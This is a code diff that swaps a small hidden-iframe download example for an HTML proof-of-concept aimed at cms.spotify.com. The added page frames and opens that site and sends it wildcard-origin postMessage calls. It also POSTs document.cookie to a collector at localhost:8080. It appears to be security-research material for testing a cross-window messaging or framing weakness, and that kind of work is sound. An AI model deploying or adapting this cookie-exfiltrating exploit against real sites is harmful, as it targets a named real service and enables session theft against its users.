@@ -1,24 +1,42 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-  <title>Download File Example</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-</head>
-<body>
-  <iframe id="download-frame" style="display:none;"></iframe>
-  <button id="download-button">Download File</button>
-
-  <script>
-    $(document).ready(function() {
-      $('#download-button').click(function() {
-        var downloadUrl = 'https://i-am-reset.github.io/'; // Replace with your download URL
-        var downloadFrame = $('#download-frame')[0];
-        downloadFrame.src = downloadUrl;
-        downloadFrame.onload = function() {
-          alert('File downloaded successfully! I love you.');
-        }
-      });
-    });
-  </script>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <title>POC</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+      }
+      iframe {
+        border: none;
+        width: 100%;
+        height: 100%;
+      }
+    </style>
+    <script>
+      function pocLink() {
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:8080/");
+        xhr.setRequestHeader("Content-Type", "text/plain");
+        xhr.send(document.cookie);
+        let win = window.open('https://cms.spotify.com/');
+        setTimeout(function () {
+          win.postMessage("message", "*");
+        }, 5000);
+      }
+      function pocFrame(win) {
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:8080/");
+        xhr.setRequestHeader("Content-Type", "text/plain");
+        xhr.send(document.cookie);
+        win.postMessage("message", "*");
+      }
+    </script>
+  </head>
+  <body>
+    <iframe src="https://cms.spotify.com/" onload="pocFrame(this.contentWindow)"></iframe> 
+  </body>
 </html>
